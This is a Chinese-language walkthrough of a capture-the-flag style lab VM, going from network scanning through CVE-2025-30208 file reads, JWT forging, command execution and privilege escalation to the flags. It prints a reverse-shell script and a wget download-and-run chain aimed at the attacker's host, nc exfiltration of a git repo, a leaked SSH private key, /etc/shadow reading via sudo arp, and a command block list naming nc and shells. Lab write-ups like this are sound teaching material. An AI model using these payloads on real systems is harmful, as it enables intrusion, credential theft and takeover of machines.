# **一、信息收集**

首先，使用`arp-scan`工具对当前局域网进行扫描，以发现存活主机并确定靶机的IP地址。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                               
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:df:47:90       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.149`。

接着，使用`nmap`对目标主机进行全端口扫描，以探测其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 07:29 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00020s latency).
Not shown: 65535 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: 08:00:27:DF:47:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
```

扫描结果显示，目标主机仅开放了 3000 端口。

使用`curl`访问该端口提供的Web服务，查看页面源代码。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000                                                               
<!doctype html>
<html lang="en">
  <head>
    <script type="module" src="/@vite/client"></script>
...
    <title>Vite + Vue</title>
...
    <script type="module" src="/src/main.js"></script>
...
</html>
```

从返回的HTML内容可以判断，这是一个基于 Vite 和 Vue 构建的前端项目。Vite 是一个现代化的前端构建工具，其在开发模式下会提供一个开发服务器。

# **二、漏洞发现与利用**

尝试读取该Vite项目的配置文件`vite.config.js`，以了解其后端代理和安全设置。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000/vite.config.js 
import { defineConfig } from "/node_modules/.vite/deps/vite.js?v=4e07dcb1"
...
export default defineConfig({
  plugins: [vue()],
  server: {
    proxy: {
      '/sign': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/sign/, '/api/sign')
      },
      '/execute': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/execute/, '/api/execute')
      }
    },
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],
    }
  },
})
```

配置文件暴露了两个API代理路径 `/sign` 和 `/execute`，它们都被转发到本地的 `http://localhost:3001` 服务。同时，`fs.deny` 配置项试图阻止对 `.env` 等敏感文件的直接访问。

继续读取后端服务的主逻辑文件 `server.js`。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149:3000/server.js
...
app.get('/api/sign', (req, res) => {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) => {
...
    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
...
    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
...
});
...
```

代码审计发现：

1.  `/api/sign` 接口使用 `process.env.JWT_SECRET` 作为密钥，签发一个角色为 `guest` 的JWT。
2.  `/api/execute` 接口要求请求头中包含有效的JWT，并验证其 `role` 是否为 `admin`，之后会执行 `cmd` 参数传入的命令。

尽管 `vite.config.js` 中配置了 `fs.deny`，但 Vite 在某些版本中存在目录遍历和文件读取漏洞（此靶机环境中为**CVE-2025-30208**），可以绕过该限制。通过特定payload可以读取到 `.env` 文件内容。

> [!Tip]
>
> https://github.com/ThumpBo/CVE-2025-30208-EXP

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s 'http://192.168.205.149:3000/opt/node/.env?import&raw??'
export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"
```

成功获取到 `JWT_SECRET`：`2942szKG7Ev83aDviugAa6rFpKixZzZz`，以及命令执行的黑名单 `COMMAND_FILTER`。

利用获取到的 `JWT_SECRET`，我们可以伪造一个角色为 `admin` 的JWT。可以访问 [[jwt.cagdastunca.com](https://jwt.cagdastunca.com/)](https://jwt.cagdastunca.com/) 或其他JWT工具来完成此操作。

**伪造的Payload:**

```json
{
  "uid": -1,
  "role": "admin",
  "iat": 1756035331,
  "exp": 1756037131
}
```

**生成的Admin Token:**
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0`

使用伪造的Token尝试执行 `id` 命令，验证远程代码执行（RCE）是否成功。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ADMIN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTYwMzUzMzEsImV4cCI6MTc1NjAzNzEzMX0.meJBbQUW_wJiQBM7FBtF6IIdP0SJrD5Z_tXJoRr6yi0"
      
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.205.149:3000/execute?cmd=id"
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

命令成功执行，当前用户为 `runner`。

# **三、获取反弹Shell**

为了获得一个交互式的Shell，我们准备进行反弹Shell操作。通过执行 `busybox` 命令，可以查看目标系统支持的工具。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -g -H "Authorization: Bearer $ADMIN_TOKEN" "http://192.168.205.149:3000/execute?cmd=busybox"
{"status":"executed","data":{"stdout":"BusyBox v1.37.0 ... \n ... \n\t ... nc, netstat, ... wget, ...\n ...","stderr":""}}
```

目标系统存在 `busybox nc` 和 `wget`，且均未被`COMMAND_FILTER`过滤。可以利用这些工具来获取反弹Shell。

1. 在本地Kali攻击机上创建一个包含反弹Shell命令的脚本 `sss`。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ cat sss
   busybox nc 192.168.205.128 8888 -e /bin/ash
   ```

2. 在Kali上开启一个临时的HTTP服务，用于靶机下载脚本。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. 在Kali上使用 `nc` 监听8888端口，准备接收反弹Shell。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 8888
   ```

4. 通过RCE漏洞，执行一串命令：下载脚本(`wget`)，赋予执行权限(`chmod`)，然后执行脚本。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ curl -g -H "Authorization: Bearer $ADMIN_TOKEN" 'http://192.168.205.149:3000/execute?cmd=wget%20192%2E168%2E205%2E128%2Fsss%0Achmod%20%2Bx%20%2E%2Fsss%0A%2E%2Fsss'
   ```

成功接收到反弹Shell。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                     
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 45275
id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
```

# **四、横向移动**

在获得的Shell中进行信息收集，发现 `/opt` 目录下存在一个 `gitea` 目录，其中包含一个名为 `node.git` 的git仓库。

```shell
...
cd /opt/gitea/git/hana
ls -al
total 12
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:22 ..
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 node.git
```

为了深入分析，我们将整个 `node.git` 仓库打包并传回Kali攻击机。

1. 在靶机上，将 `node.git` 目录打包。

   ```shell
   busybox tar -cf /tmp/1.tar node.git
   ```

2. 在Kali上监听1234端口，并将接收到的数据保存为 `1.tar`。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 1234 > 1.tar
   ```

3. 在靶机上，使用 `nc` 将打包好的文件发送到Kali。

   ```shell
   cat 1.tar|busybox nc 192.168.205.128 1234
   ```

文件传输完成后，在Kali上解压并分析git仓库的历史记录。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tar -xf 1.tar
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd node.git 
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/node.git]
└─$ git log -p
```

`git log -p` 的输出显示了一个非常关键的提交历史：开发者曾错误地将一个SSH私钥 `id_ed25519` 提交到仓库，随后又在下一次提交中将其删除。

```diff
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -> main)
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
```

从diff信息中提取私钥内容并还原。在反弹Shell中，通过`netstat -lntup`发现SSH服务仅监听在`127.0.0.1:22`，无法从外部直接访问。

```shell
netstat -lntup
Active Internet connections (only servers)
...          
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
...
```

为了能够使用获取到的私钥登录，需要在靶机上进行端口转发，将内部的SSH服务暴露给攻击机。这里使用`socat`将2222端口的流量转发至127.0.0.1:22。

```shell
socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22 &
```

现在，可以使用私钥通过2222端口SSH登录`hana`用户。

```shell
┌──(kali㉿kali)-[/tmp]
└─$ # ... (还原私钥到 /tmp/id_rsa) ...
                                                                                   ┌──(kali㉿kali)-[/tmp]
└─$ sed -i 's/^-//' id_rsa                                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ssh hana@192.168.205.149 -p 2222 -i /tmp/id_rsa
...
devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
```

成功以 `hana` 用户身份登录。

# **五、权限提升**

登录 `hana` 用户后，检查其 `sudo` 权限。

```shell
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
...
User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

结果显示 `hana` 用户可以无密码以root权限执行 `/sbin/arp` 命令。这是一个已知的可被利用于提权的配置。查询 [[GTFOBins](https://gtfobins.github.io/gtfobins/arp/#sudo)](https://gtfobins.github.io/gtfobins/arp/#sudo) 可知，`arp` 命令的 `-f` 参数可以加载一个文件，如果指定的文件不存在或格式错误，它会尝试逐行读取并显示文件内容，从而实现任意文件读取。

利用此特性读取 `/etc/shadow` 文件，获取root用户的密码哈希。

```shell
devoops:~$ sudo arp -v -f /etc/shadow
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
....
```

将获取到的root用户哈希保存到本地文件，并使用 `john` 和字典进行破解。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.' > hash
                          
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=xato-net-10-million-passwords.txt hash
...
eris             (root)     
...
Session completed. 
```

成功破解出root密码为 `eris`。

# **六、获取Flag**

使用破解出的密码切换到 `root` 用户，提权完成。

```shell
devoops:~$ su -
Password: 
devoops:~#
```

最后，在 `root` 和 `hana` 的家目录中找到并读取flag文件。

```shell
devoops:~# cat /root/R007.7x7oOoOoOoOoOoO /home/hana/user.flag 
flag{a834296543f4c2990909ce1c56becfba}
flag{03d0e150ae9fc686a827b41e1969d497}
```